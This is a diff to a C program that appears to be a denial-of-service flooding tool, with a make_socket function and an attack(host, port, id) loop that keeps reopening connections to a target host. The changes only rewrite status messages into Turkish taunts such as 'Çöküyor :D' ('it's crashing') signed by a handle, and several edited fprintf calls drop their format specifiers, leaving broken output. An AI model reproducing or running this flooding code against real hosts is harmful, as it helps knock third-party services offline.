@@ -18,7 +18,7 @@ int make_socket(char *host, char *port) {
 	hints.ai_family = AF_UNSPEC;
 	hints.ai_socktype = SOCK_STREAM;
 	if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
-		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
+		fprintf(stderr, "adres bilgisi al:", gai_strerror(r));
 		exit(0);
 	}
 	for(p = servinfo; p != NULL; p = p->ai_next) {
@@ -34,12 +34,12 @@ int make_socket(char *host, char *port) {
 	if(p == NULL) {
 		if(servinfo)
 			freeaddrinfo(servinfo);
-		fprintf(stderr, "Saitshi Ver Ukavshirdeba!\n");
+		fprintf(stderr, "Yanlış Karakter Girdiniz!");
 		exit(0);
 	}
 	if(servinfo)
 		freeaddrinfo(servinfo);
-	fprintf(stderr, "[Connected -> %s:%s]\n", host, port);
+	fprintf(stderr, "Çöküyor :D ", host, port);
 	return sock;
 }
 
@@ -65,9 +65,9 @@ void attack(char *host, char *port, int id) {
 				close(sockets[x]);
 				sockets[x] = make_socket(host, port);
 			} else			
-			fprintf(stderr, "[%i: uçalım :) By S:SaLvOdOs/A/]\n", id);
+			fprintf(stderr, "uçuralım ;D By S:SaLvOdOs", id);
 		}
-		fprintf(stderr, "[%i: uçalım :) By S:SaLvOdOs/A/]\n", id);
+		fprintf(stderr, "uçuralım ;D By S:SaLvOdOs", id);
 		usleep(300000);
 	}
 }
